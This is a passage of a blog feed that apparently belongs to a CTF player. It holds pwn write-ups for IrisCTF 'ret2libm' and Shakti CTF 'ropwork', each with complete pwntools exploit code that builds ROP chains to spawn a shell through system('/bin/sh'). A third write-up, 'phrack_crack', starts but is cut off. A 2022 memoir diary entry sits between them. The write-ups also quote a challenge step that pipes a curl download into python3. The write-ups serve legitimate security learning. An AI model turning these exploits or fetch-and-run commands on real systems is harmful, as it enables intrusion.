        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>49 Solves (4.7% of users)<br>392 Points (500 Points)</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>I need to make a pwn? Let‚Äôs go with that standard warmup rop thing‚Ä¶ what was it‚Ä¶ ret2libm?<br><code>nc ret2libm.chal.irisc.tf 10001</code></p><p>Hint!<br>The challenge server may be acting up. If your solution works locally and on the docker but not on remote, please open a ticket!</p><p>By: sera</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">‚îú‚îÄ‚îÄ chal</span><br><span class="line">‚îú‚îÄ‚îÄ chal.c</span><br><span class="line">‚îú‚îÄ‚îÄ libc-2.27.so</span><br><span class="line">‚îú‚îÄ‚îÄ libm-2.27.so</span><br><span class="line">‚îî‚îÄ‚îÄ Makefile</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chal: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=2c6fac9007a0e13f2ca1978d85d974afb7fd03d9, not stripped</span><br></pre></td></tr></table></figure><p>This challenge use a <code>libc-2.27.so</code> So enviroment seems to Ubuntu 18.04 that different to me. That enviroment is different from mine, I downloaded <code>ld</code> file with docker. And then I patched it. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[jir4vvit@arch ret2libm]$ ldd chal</span><br><span class="line">linux-vdso.so.1 (0x00007fff13dc7000)</span><br><span class="line">./libm-2.27.so (0x00007fbe43800000)</span><br><span class="line">./libc-2.27.so (0x00007fbe43400000)</span><br><span class="line">./ld-2.27.so =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007fbe43e9a000)</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// gcc -fno-stack-protector -lm</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv)</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> yours[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Check out my pecs: %p\n&quot;</span>, <span class="built_in">fabs</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;How about yours? &quot;</span>);</span><br><span class="line">    gets(yours);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s see how they stack up.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The challenge leaks the pointer to a <code>fabs</code> in libm.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>The <code>gets()</code> functions cause to <code>Buffer overflow</code>. We can change the <code>RIP</code>.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><p>Just do it!</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chal&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./chal&#x27;, env = &#123;</span></span><br><span class="line">    <span class="comment"># &#x27;LD_PRELOAD&#x27; : &#x27;./libm-2.27.so&#x27;</span></span><br><span class="line">    <span class="comment"># &#125;)</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./chal&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;ret2libm.chal.irisc.tf&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">libm = ELF(<span class="string">&#x27;./libm-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">server</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;python3&#x27;</span>)</span><br><span class="line">    cmd = <span class="string">b&#x27;python3&#x27;</span> + p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(cmd)</span><br><span class="line">    res = subprocess.check_output([<span class="string">&#x27;bash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, cmd])</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Solution?&#x27;</span>, res)</span><br><span class="line"></span><br><span class="line">server()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;pecs:&#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>)</span><br><span class="line">info(<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libm_base = leak - libm.sym[<span class="string">&#x27;fabsf64&#x27;</span>]</span><br><span class="line">info(<span class="built_in">hex</span>(libm_base))</span><br><span class="line"></span><br><span class="line">libc.address = libm_base - <span class="number">0x3f1000</span> </span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x8</span> + <span class="number">0x8</span>)</span><br><span class="line"><span class="comment"># payload += p64(libc.address + 0x02164f) # pop rdi</span></span><br><span class="line"><span class="comment"># payload += p64(next(libc.search(b&#x27;/bin/sh\x00&#x27;)))</span></span><br><span class="line"><span class="comment"># payload += p64(libc.address + 0x8aa) # ret</span></span><br><span class="line"><span class="comment"># payload += p64(libc.sym[&#x27;system&#x27;])`</span></span><br><span class="line"></span><br><span class="line">payload += p64(libm_base + <span class="number">0xbc37</span>) <span class="comment"># pop rdi</span></span><br><span class="line">payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">payload += p64(libm_base + <span class="number">0x2a2</span>) <span class="comment"># ret</span></span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;yours?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>In this CTF, Perhaps to prevent brute force, the following process is added when connecting to the server.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">== proof-of-work: enabled ==</span><br><span class="line">please solve a pow first</span><br><span class="line">You can run the solver with:</span><br><span class="line">    python3 &lt;(curl -sSL https://goo.gle/kctf-pow) solve s.ADQ6.AADPFiV0veQZlf8vJux482QM</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">Solution?</span><br></pre></td></tr></table></figure><p>And In this challenge, We can use onegadget. :-)</p><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">irisctf&#123;oh_its_ret2libc_anyway&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Iris </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2022-12-31 Diary (2022 Memoir)</title>
      <link href="/221231-diary/"/>
      <url>/221231-diary/</url>
      
        <content type="html"><![CDATA[<p>Today is 2022‚Äôs last day. So, I‚Äôm writing a 2022 Memoir. :-D</p><h2 id="Graduated-University"><a href="#Graduated-University" class="headerlink" title="Graduated University"></a>Graduated University</h2><p>After completing BoB in the first half of the year, I returned to University. At the same time, I joined the company, so I didn‚Äôt go to University, but I devoted time to graduation assignments. I tended to go to University diligently during the past period. I always did my best to do my assignments or not be absent‚Ä¶ etc. Going to University while working at the same time was harder than I thought. The hardest thing was to do graduation assignments. Still, thanks to the team members, I was able to finish my graduation assignments well and received the highest grade of A+. I‚Äôm very satisfied.</p><p>The content of graduation assignment is as follows. We proposed a market and developed a system to trade ultra-light food for single students or dormitory students attending our University. My role in the project was DB development and backend development. We use the Node JS for development.</p><p>I was able to successfully achieve my graduation in August by successfully obtaining the license(Ï†ïÎ≥¥Ï≤òÎ¶¨Í∏∞ÏÇ¨) for graduation within the deadline. I‚Äôm so glad. In fact, around the time I graduated, I formed a team as a University student and participated in the offline CTF. I placed on 6th in 2022 Hektheon Sejong 1st CTF. My role was Pwnable. I also worked hard to solve the problem, but in the end, I think I won the award thanks to other people.</p><h2 id="Joining-and-Leaving-the-company"><a href="#Joining-and-Leaving-the-company" class="headerlink" title="Joining and Leaving the company"></a>Joining and Leaving the company</h2><p>I joined an offensive research company in March of this year, a month before completing BoB. It was my first social life outside of University and BoB. I originally intended to organize my life in Seoul after completing BoB and go to the school dormitory to rest. However, the company gave me a good opportunity of assignments and interviews, so I worked hard and passed and joined the company. So, I remember canceling my University dormitory in a hurry. I thought attending a company was a much better opportunity for me than going back to University. I joined the company with such a hopeful mindset, but resigned in September.</p><p>There are many reasons for leaving the company, but one of them is to travel in search of a dream.(?) I felt cramped while going to the company, and even though I only went to the company for a short period of time, I didn‚Äôt think it was helpful. It has been about 3 months since I left. I am so happy now. I don‚Äôt think in a hurry and have time to spare, so I‚Äôm working on the computer with a more enjoyable mind than before. I really like myself for having this mindset.</p><h2 id="Demon-Team"><a href="#Demon-Team" class="headerlink" title="Demon Team"></a>Demon Team</h2><p>Demon team did a lot of things this year. Next year, I want to do a lot of useful and fresh things.</p><ol><li>Although the team name was not listed in the article, We participated in the CDDC 2022 program. My role in the program was prepared for basic English lectures on overall security. I remember preparing for about two months from April.</li></ol><ul><li>related article: <a href="https://www.dailysecu.com/news/articleView.html?idxno=137993&amp;fbclid=IwAR2qQR6MNc4djC_ACV__bc0kqmpdXiEW9P4rGU5VtwmZcv3kKd6iVn_d-58&amp;fs=e&amp;s=cl">https://www.dailysecu.com/news/articleView.html?idxno=137993&amp;fbclid=IwAR2qQR6MNc4djC_ACV__bc0kqmpdXiEW9P4rGU5VtwmZcv3kKd6iVn_d-58&amp;fs=e&amp;s=cl</a></li></ul><ol start="2"><li><p>I was prepared Chungbuk Hacking Camp system hacking lecture and Pwnable field of CTF. The CDDC above was an online lecture, but this Chungbuk Hacking Camp lecture was an offline. I remember being very nervous because it was my first offline presentation. It was disappointing that out of 20 high school students, there were only 1 or 2 students who focused more on Pwnable than expected. However, I felt fortunate that I prepared a really basic lecture. I remember that this was in July.</p></li><li><p>I gave a presentation of Summer Hacking camp. And I wrote a Pwanble challenge for the CTF held in there. The presentation was prepared with a senior from the previous company. I don‚Äôt remember exactly when, but I remember it was after the Hacking camp in Chungbuk. The topic of the presentation is my history of system hacking up to this point. I thought it was enough to share the experience because I completed BoB shortly after I started studying and joined the company right away. However, now I am confident that I have grown much more skillfully than I did back then. If there are good results in my personal research, I would like to make a presentation at Hacking Camp with technical content next time.</p></li><li><p>I wrote a Pwnable challenge for the Women‚Äôs Hacking Contest Power Of XX. There were two challenges each in the preliminaries and finals. In the finals, I wrote a one more challenge for Misk. This is November, and it is the time when I left the company. That‚Äôs why I had relatively more time, so I did a lot of research on the challenge, and I‚Äôm attached to it. Information on the challenge is attached below.</p></li></ol><ul><li><a href="https://jiravvit.github.io/221121-poxx2022-shop_revenge/">https://jiravvit.github.io/221121-poxx2022-shop_revenge/</a></li></ul><h2 id="New-beginnings-with-MacBook-Air-M2"><a href="#New-beginnings-with-MacBook-Air-M2" class="headerlink" title="New beginnings (with MacBook Air M2)"></a>New beginnings (with MacBook Air M2)</h2><p>After leaving the scompany, everything changed. I always hacked with an anxious and urgent mindset, but now I have a time to spare. It‚Äôs a fun and happy feeling. I received a MacBook as a gift this time, and I feel happier because I use it. Speaking of Mac, I have been using Windows, Linux, and Mac OS this year. I‚Äôve been using Linux for about 3 months and Mac for about a month, but I like Mac the most. It is the prettiest and most sophisticated feeling.</p><p>Anyway, I‚Äôm happy to be able to greet 2023 with a new MacBook. I feel like I can live happily ever after. I will have to use my MacBook for the rest of my life! ;)</p><br><img src="/images/221231-diary/221231-mac.png" width="450"/>]]></content>
      
      
      <categories>
          
          <category> Diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shakti CTF 2022 - ropwork (hard)</title>
      <link href="/221222-shaktictf2022-ropwork/"/>
      <url>/221222-shaktictf2022-ropwork/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(9&#x2F;387) solves</p><p>Hard</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>The fisherman is trying to untangle his fishing knots. If you could help him with it, it would be great!</p><p>Note:<br>The server is running on Ubuntu 20.04<br>The flag file found on the server is given a random name.<br>Author: d1g174l_f0rtr355</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropework_460328c6-afec-4492-9b9f-97a1f35c71af: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.31.so, for GNU/Linux 3.2.0, BuildID[sha1]=8186a401dd45223b37552a01bd54666547a11437, not stripped</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3fd000)</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  system(<span class="string">&quot;echo &#x27;The fisherman is trying to untangle his fishing knots. If you could help him with it, it would be great!\n&#x27;&quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">329</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  system(<span class="string">&quot;echo &#x27;Ok bye!\n&#x27;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÎåÄÎÜìÍ≥† bof ÌÑ∞ÏßÑÎã§.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p><code>fgets</code> Ìï®ÏàòÏóêÏÑú Î≥ÄÏàò ÏÇ¨Ïù¥Ï¶àÎ≥¥Îã§ Îçî ÌÅ∞ Í∞íÏùÑ Ïì∏ Ïàò ÏûàÏñ¥ÏÑú bofÍ∞Ä ÌÑ∞ÏßÑÎã§.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><p>bss + 0x20 ÏóêÎã§Í∞Ä &#x2F;bin&#x2F;sh Ïç®Ï£ºÍ≥† system Ìï®Ïàò Ïù∏ÏûêÎ°ú Ïù¥Í±∏ Ï§òÏÑú Ïã§ÌñâÏãúÏº∞Îã§.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;65.2.136.80&#x27;</span>, <span class="number">31825</span>)</span><br><span class="line">libc = e.libc</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">xor_rax = <span class="number">0x401182</span></span><br><span class="line">pop_rdi = <span class="number">0x401273</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x401271</span></span><br><span class="line">xor_rdx_rbx = <span class="number">0x040118e</span></span><br><span class="line">syscall = <span class="number">0x4011a2</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x10</span>+<span class="number">0x8</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15) + p64(e.bss()+<span class="number">0x20</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(xor_rdx_rbx)</span><br><span class="line">payload += p64(xor_rax) <span class="comment"># sys_read</span></span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x8</span></span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x10</span>+ <span class="number">0x8</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(e.bss()+<span class="number">0x20</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h3><p>Ï≤òÏùåÏóê csu Í∞ÄÏ†ØÏúºÎ°ú Î¨∏Ï†úÎ•º ÌíÄÎ†§Í≥† ÌñàÏóàÎäîÎç∞ Î≠îÍ∞Ä Ïûò ÏïàÎêòÏñ¥ÏÑú Îã§Î•∏ Î∞©Î≤ï ÏÉùÍ∞ÅÌï¥Î≥¥Îã§Í∞Ä Î¨∏Ï†úÎ•º ÌíÄÏóàÎã§. Ïó≠Ïãú.. Î°∏ÏóÖÏùÄ Î¨∏Ï†ú ÌíÄÍ≥† Î∞îÎ°úÎ∞îÎ°ú ÏûëÏÑ±Ìï¥Ïïº ÏÉùÏÉùÌïòÍ≤å Ï†ÅÏùÑ Ïàò ÏûàÎäî Í≤É Í∞ôÎã§.. (Îã§Ïãú ÌíÄÍ∏¥.. Ï¢Ä..) Ïù¥Ï†ú Î°∏ÏóÖ ÏïàÎØ∏Î£®Í≥† Ïûò Ï†ÅÏùÑ Í≤ÉÏù¥Îã§..</p><p>ÏïÑ Í∑∏Î¶¨Í≥† Ïù¥ Ïî®ÌÖùÏóêÏÑú Î°∏ÏóÖÏúºÎ°ú Ï†ÅÏùÄ ÏÑ∏ Î¨∏Ï†ú ÎßêÍ≥† easy 2Î¨∏Ï†úÏôÄ meduim Ìïú Î¨∏Ï†úÍ∞Ä ÏûàÏóàÎã§. easyÎäî ÎÑàÎ¨¥ Ïâ¨ÏõåÏÑú Î°∏ÏóÖ ÏóÖÎ°úÎìúÎ•º ÏïàÌïòÎ†§Í≥† ÌïúÎã§. (ÏÜîÎ∏åÍ∞Ä Í±∞Ïùò 60~70Ïù¥Îã§.) mediumÏùÄ Î™ªÌíÄÏóàÎäîÎç∞ Ïó∞Í≤∞Î¶¨Ïä§Ìä∏ Íµ¨ÌòÑ Í¥ÄÎ†®Îêú Î¨∏Ï†úÏù¥Îã§. Ïó∞Í≤∞Î¶¨Ïä§Ìä∏Í∞Ä Î≠îÏßÄ ÍπåÎ®πÏñ¥ÏÑú.. ctf Í∏∞Í∞Ñ Îïå Ïó∞Í≤∞Î¶¨Ïä§Ìä∏ Í≥µÎ∂ÄÌñàÎçò Í∏∞ÏñµÏù¥ ÎÇúÎã§.<br>ÏïÑÎ¨¥Ìäº Ïù¥ Ïî®ÌÖùÏóêÏÑú Ìè¨ÎÑàÎ∏îÏù¥ Ï¥ù 6Í∞úÏòÄÎäîÎç∞ Ìïú Î¨∏Ï†ú ÎπºÍ≥† Îã§ ÌíÄÏñ¥ÏÑú Í∏∞Î∂ÑÏù¥ ÍµâÏû•Ìûà Ï¢ãÏïòÎã§. ÎÇ®ÏùÄ Ïó∞Í≤∞Î¶¨Ïä§Ìä∏ Í¥ÄÎ†® Î¨∏Ï†úÎäî Í≤∞Íµ≠ Î°∏ÏóÖÏùÑ Î¥§ÎäîÎç∞ heapÏóêÏÑú unsafe-unlinkÎùºÎäî Í∏∞Î≤ïÏùÑ ÏÇ¨Ïö©ÌïòÏó¨ ÏùµÏä§Î•º ÌïòÎäî Î¨∏Ï†úÏù¥Îã§. Í∞úÏù∏Ï†ÅÏúºÎ°ú heap Í¥ÄÎ†® Î¨∏Ï†úÎäî ÎÇ¥Í∞Ä heapÏùÑ Í≥µÎ∂ÄÎ•º Ï†úÎåÄÎ°ú ÏïàÌñàÍ∏∞ ÎïåÎ¨∏Ïóê ÌíÄÏßÄ ÏïäÎäîÎã§.(?????) ÌèâÏÉù ÏïàÌï† Í≥ÑÌöçÏùÄ ÏïÑÎãàÍ≥† ÎÇ¥ÎÖÑÏúºÎ°ú ÎØ∏Î§ÑÎë¨ÏïºÏßÄ.</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Shakti </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Shakti CTF 2022 - phrack_crack (hard)</title>
      <link href="/221222-shaktictf2022-phrack_crack/"/>
      <url>/221222-shaktictf2022-phrack_crack/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(9&#x2F;387) solves</p><p>Hard</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>phrack_phrack_phrack_crack_crack_crack.<br>Note: The server is running on Ubuntu 20.04.<br>Author: d1g174l_f0rtr355</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">‚îú‚îÄ‚îÄ ld.so.2</span><br><span class="line">‚îú‚îÄ‚îÄ libc.so.6</span><br><span class="line">‚îî‚îÄ‚îÄ phrack_crack</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phrack_crack: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=06dd3b9850dc326bd98cb17e0049bcec4bd15219, not stripped</span><br></pre></td></tr></table></figure><p>ldÏôÄ libcÍ∞Ä Ï£ºÏñ¥Ï°åÏúºÎãà patchelfÎ•º Ïù¥Ïö©Ìï¥ÏÑú Ìå®ÏπòÌï¥Ï£ºÍ≥† Î¨∏Ï†úÌíÄÏù¥Î•º ÌïòÏòÄÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">linux-vdso.so.1 (0x00007ffc78b1f000)</span><br><span class="line">./libc.so.6 (0x00007f8d6e200000)</span><br><span class="line">./ld.so.2 =&gt; 